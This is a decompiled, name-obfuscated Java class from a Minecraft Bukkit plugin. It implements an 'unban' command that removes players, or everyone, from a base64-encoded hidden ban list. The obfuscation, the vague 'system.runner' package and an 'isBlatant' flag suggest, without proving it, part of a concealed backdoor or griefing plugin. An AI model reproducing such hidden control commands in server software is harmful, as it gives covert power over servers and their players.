/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.OfflinePlayer
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import java.util.Base64;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;

public class UnbanCommand
extends Command {
    public UnbanCommand() {
        UnbanCommand lllllllllllllIlIIIllIllIIIIlllII;
    }

    @Override
    public void execute(Core lllllllllllllIlIIIllIllIIIIlIIIl, String lllllllllllllIlIIIllIllIIIIlIIII, String[] lllllllllllllIlIIIllIllIIIIIllIl, Player lllllllllllllIlIIIllIllIIIIIllII) {
        if (lllllllllllllIlIIIllIllIIIIIllIl.length <= 1) {
            lllllllllllllIlIIIllIllIIIIIllII.sendMessage(Settings.USAGE("unban <player>"));
        } else if (lllllllllllllIlIIIllIllIIIIIllIl[1].equals("*")) {
            for (String lllllllllllllIlIIIllIllIIIIlIlIl : DataManager.getData().getStringList("epic-players")) {
                byte[] lllllllllllllIlIIIllIllIIIIlIllI = Base64.getEncoder().encode(lllllllllllllIlIIIllIllIIIIlIlIl.getBytes());
                DataManager.bannedPlayers.remove(new String(lllllllllllllIlIIIllIllIIIIlIllI));
                DataManager.getData().set("epic-players", DataManager.bannedPlayers);
                DataManager.saveData();
            }
            lllllllllllllIlIIIllIllIIIIIllII.sendMessage(Settings.PREFIX("Everyone was unbanned!"));
        } else {
            OfflinePlayer lllllllllllllIlIIIllIllIIIIlIIll = Bukkit.getServer().getOfflinePlayer(lllllllllllllIlIIIllIllIIIIIllIl[1]);
            if (lllllllllllllIlIIIllIllIIIIlIIll == null) {
                lllllllllllllIlIIIllIllIIIIIllII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllIlIIIllIllIIIIIllIl[1]).append(Settings.WHITE).append(" doesn't seem to exist."))));
            } else {
                byte[] lllllllllllllIlIIIllIllIIIIlIlII = Base64.getEncoder().encode(lllllllllllllIlIIIllIllIIIIlIIll.getUniqueId().toString().getBytes());
                DataManager.bannedPlayers.remove(new String(lllllllllllllIlIIIllIllIIIIlIlII));
                DataManager.getData().set("epic-players", DataManager.bannedPlayers);
                DataManager.saveData();
                lllllllllllllIlIIIllIllIIIIIllII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append(lllllllllllllIlIIIllIllIIIIlIIll.getName()).append(" was unbanned!"))));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

